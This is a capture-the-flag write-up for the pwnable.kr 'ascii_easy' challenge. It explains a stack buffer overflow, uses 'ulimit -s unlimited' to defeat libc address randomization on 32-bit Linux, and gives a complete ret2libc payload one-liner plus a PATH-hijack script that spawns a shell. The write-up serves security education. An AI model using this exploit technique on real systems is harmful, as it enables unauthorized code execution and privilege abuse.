---
title: Ascii_easy - Pwnable.kr
date: 2016-07-19
categories: [Writeups, Pwnable.kr]
tags: ['Ret2libc', 'Buffer overflow', 'ASLR', 'Ascii armor']
image:
    path: "/unsorted/pwnablekr.png"

---

As usual, we have a program: `ascii_easy`,  which has the permissions
to get the flag. After a fast reverse-engineering we can imagine that
the source code from where it comes from should look more or less
like this:

```c
#define MEM 0x80000000

int is_ascii(char c){
    if (c <= 0x1f || c > 0x7f) return 0; // 0x20 == ' ' 
    return 1;
}

void vuln(){
    
    char local[0xa8];
    strcpy(local, MEM);
}


void main(){

   char* mem = mmap( MEM, 0x1000,
                   PROT_READ   | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_FIXED  | MAP_ANONYMOUS,
                   -1, 0
            );

    if (mem != MEM){
        puts("mmap failed. tell admin");
        exit(1);
    }

    int i = 0;
    printf("Input text : ");
    while (i <= 0x18f){
        mem[i] = getchar();
        i++;
        if (is_ascii(mem[i]) == 0) break;
    }

    puts("triggering bug...");
    vuln();
}
```


First of all we can note that the user input must contain
only (an exception could be made for the last character to be precise)
ascii values.

Furthermore it looks like there is a buffer overflow vulnerability: 
we have the control over the first `0x18f` bytes of the memory mapped 
by `mmap`. This data provided by the user is then copied into 
a much smaller buffer into the stack, this happens inside the functon `vuln`.

The stack is not executable:

```console
ascii_easy@ubuntu:~$ readelf -l ascii_easy 

Elf file type is EXEC (Executable file)
Entry point 0x8048420
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00834 0x00834 R E 0x1000
  LOAD           0x000f14 0x08049f14 0x08049f14 0x00114 0x0011c RW  0x1000
  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x0006e8 0x080486e8 0x080486e8 0x00044 0x00044 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1
```

...but it looks like the memory mapped by mmap is set to be executable,
so we could just use an ascii shellcode and somehow redirect the 
execution flow on the buffer mapped at the address `0x80000000`.

For this time I'm going to use a ret2libc style exploit, beside it is probably
what pwnable.kr is suggesting giving us these two hints:

- hint : ulimit
- hint2: system, execl, execlp ... etc

A fast search about ulimit and ret2libc exploits brought me these results:

- <https://stackoverflow.com/questions/17630745/why-ulimit-s-unlimited-can-de-aslr-in-overflow>
- <https://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home>

An old implementation of `mmaps` doesn't use ASLR when the stack size limit
is set to unlimited, and guess what...the binary `ascii_easy` is a 32bits 
architecture. So `ulimit -s unlimited` should do the work in order to have
libc mapped always at the same address.

Note: apparently this "flaw" has been 
[fixed](https://hmarco.org/bugs/CVE-2016-3672-Unlimiting-the-stack-not-longer-disables-ASLR.html)
recently.

Let's use `execlp` to spawn a shell. After the stack's size has been set to
unlimited let's figure out the address of this function:

```txt
(gdb) p execlp
$1 = {<text variable, no debug info>} 0x55643970 <execlp>
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ascii_easy/ascii_easy 

Breakpoint 1, 0x08048516 in main ()
(gdb) p execlp
$2 = {<text variable, no debug info>} 0x55643970 <execlp>
```


As you can see the address doesn't change. And good news: each byte of this
address is a valid printable ascii character! B) Now let's find a null
terminated string containing the name of the shell:

```txt
(gdb) info sharedlibrary 
From        To          Syms Read   Shared Object Library
0x55555820  0x5556db5f  Yes (*)     /lib/ld-linux.so.2
0x555a1f70  0x556d635c  Yes (*)     /lib/i386-linux-gnu/libc.so.6
(*): Shared library is missing debugging information.

(gdb) find 0x555a1f70, +9999999, "sh\0"
0x55681299
0x556e9841
warning: Unable to access target memory at 0x55733bc5, halting search.
2 patterns found.
```


No luck here, both the address contains some character out of the range
that we are allowed to use.  
The function `execlp` uses the value of `$PATH` to search for the executables,
this means that we can just use whatever name and arrange things in order to
let `execlp` find the executable we want. Let's pick a very short name
to increase the possibilities to find a valid address:

```txt
(gdb) find 0x555a1f70, +9999999, "h\0"
0x555aacc0
0x555af742
0x555b449e
0x555b8def <raise+31>
0x555b8e07 <raise+55>
0x555c1399
0x555c1429
0x555c17e2
...
0x556e3d3c
...
```


Let's pick `0x556e3d3c` for example. Now we are ready to build the payload.

- We have a `0xa8` (168) characters long buffer to fill completely with
      whatever kind of character in order to arrive at the `ret` address
- After the buffer there will be 4 bytes containing the value of the 
      frame pointer, we can just fill it in the same way as the buffer
- We finally arrive at the return address. Here we need to put the address
      of the function we want to execute, in this case: `execlp`
- The next 4 bytes represent the address to where `execlp` will return
      if it will fail. Classic ret2libc exploits expect the address of the
      function `exit` to be here, but let's pass on it for today...
- Now we have the arguments of `execlp`: twice the address to the string
      "h\0" + a NULL pointer

and that's all. Time to get the flag:

```console
ascii_easy@ubuntu:~$ mkdir /tmp/werew
ascii_easy@ubuntu:~$ cat > /tmp/werew/h
#!/bin/sh
/bin/sh
ascii_easy@ubuntu:~$ chmod +x /tmp/werew/h
ascii_easy@ubuntu:~$ export PATH="/tmp/werew:$PATH"
ascii_easy@ubuntu:~$ (python -c 'print("A"*172 + "\x70\x39\x64\x55" + "exit" + "\x3c\x3d\x6e\x55"*2 + "\x00\x00\x00\x00" + "\n")'; cat -) | ./ascii_easy
Input text : triggering bug...
cat flag
damn you ascii armor... **** * **** ** *** ***!! :(
```






